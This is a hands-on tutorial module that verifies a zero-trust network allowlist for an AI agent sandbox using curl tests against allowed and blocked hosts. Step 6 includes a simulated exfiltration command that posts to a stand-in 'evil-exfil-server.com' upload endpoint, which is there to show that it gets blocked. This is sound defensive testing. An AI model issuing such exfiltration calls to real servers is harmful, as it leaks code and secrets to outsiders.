# Network Zero Trust

In this module you will prove that the sandbox can **only** reach explicitly allowed endpoints. Everything else is blocked.

## The Network Policy

The Helm chart deploys a ConfigMap containing the zero-trust network policy. The actual policy from the cluster:

```yaml
network_policies:
  deepseek_api:
    name: DeepSeek API
    endpoints:
      - host: api.deepseek.com
        port: 443
    binaries:
      - { path: /usr/bin/curl }
      - { path: /usr/bin/node }
  github:
    name: GitHub
    endpoints:
      - host: github.com
        port: 443
      - host: api.github.com
        port: 443
    binaries:
      - { path: /usr/bin/git }
      - { path: /usr/bin/curl }
  npm_registry:
    name: npm Registry
    endpoints:
      - host: registry.npmjs.org
        port: 443
    binaries:
      - { path: /usr/bin/npm }
      - { path: /usr/bin/node }
```

**Three external hosts are reachable**, and access is further restricted by which binary makes the call:

| Host | Port | Allowed Binaries | Why |
|------|------|-----------------|-----|
| `api.deepseek.com` | 443 | `curl`, `node` | LLM inference |
| `github.com` / `api.github.com` | 443 | `git`, `curl` | Code repos |
| `registry.npmjs.org` | 443 | `npm`, `node` | Package install |

> **Binary-level enforcement:** Even though npm is in the allowlist, only the `npm` and `node` binaries can reach it. Running `curl https://registry.npmjs.org` will be denied because `curl` is not in npm's allowed binary list.

## Step 1 — Enter the Sandbox

```bash
openshell sandbox exec pi-agent-demo -- bash
```

## Step 2 — Test ALLOWED: DeepSeek API

```bash
curl -s -w "\nHTTP %{http_code}\n" --max-time 5 https://api.deepseek.com/models -H "Authorization: Bearer $DEEPSEEK_API_KEY" | head -c 100
```

**Why:** This tests connectivity to the DeepSeek API. The credential resolver token in `$DEEPSEEK_API_KEY` is swapped for the real key at the boundary.

Expected output:

```
{"object":"list","data":[{"id":"deepseek-chat","object":"model"...
HTTP 200
```

✅ **Allowed** — `api.deepseek.com` is in the policy and `curl` is an allowed binary for this endpoint.

## Step 3 — Test ALLOWED: GitHub

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" --max-time 5 https://github.com
```

Expected:

```
HTTP 200
```

✅ **Allowed** — `github.com` is in the policy and `curl` is an allowed binary.

## Step 4 — Test DENIED: Google

```bash
curl -v --max-time 5 https://www.google.com 2>&1 | tail -3
```

**Why:** Google is a well-known, always-available endpoint. An AI agent has no business accessing it.

Expected output:

```
* Immediate connect fail for x.x.x.x: Permission denied
* Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
curl: (7) Failed to connect to www.google.com port 443 after 2 ms: Couldn't connect to server
```

❌ **Denied** — the boundary immediately rejects the connection with `Permission denied`. The TCP connection never completes.

## Step 5 — Test DENIED: Arbitrary Endpoint

```bash
curl -v --max-time 5 https://example.com 2>&1 | tail -3
```

Expected:

```
* Immediate connect fail for x.x.x.x: Permission denied
...
curl: (7) Failed to connect to example.com port 443 ...
```

❌ **Denied** — `example.com` is not in the allowlist.

## Step 6 — Test DENIED: Data Exfiltration

Simulate an exfiltration attempt:

```bash
curl -v --max-time 5 https://evil-exfil-server.com/upload 2>&1 | tail -3
```

Expected: `Permission denied` or `Could not resolve host` — the request never leaves the sandbox.

## Step 7 — Exit the Sandbox

```bash
exit
```

## Results Summary

| Test | Target | Expected | Policy |
|------|--------|----------|--------|
| DeepSeek API | `api.deepseek.com` | HTTP 200 (with auth) | ✅ Allowed |
| GitHub | `github.com` | HTTP 200 | ✅ Allowed |
| Google | `www.google.com` | Permission denied | ❌ Denied |
| Example.com | `example.com` | Permission denied | ❌ Denied |
| Exfil Server | `evil-exfil-server.com` | Permission denied | ❌ Denied |

## Why This Matters

In a traditional container, the AI agent has **unrestricted** network access. It could:

- Call home to any server
- Exfiltrate code, secrets, or data
- Download malware
- Communicate with C2 infrastructure

With OpenShell's zero-trust network policy:

- **Default deny** — nothing is allowed unless explicitly listed
- **Binary-level control** — even allowed endpoints are restricted to specific binaries
- **Immediate rejection** — denied connections fail instantly with `Permission denied`
- **Boundary enforcement** — enforced by the supervisor outside the sandbox; the sandboxed process cannot bypass it

## Next Step

You've proven the network boundary. Next, you'll see how filesystem access is locked down.

Proceed to: **Filesystem Zero Trust** →
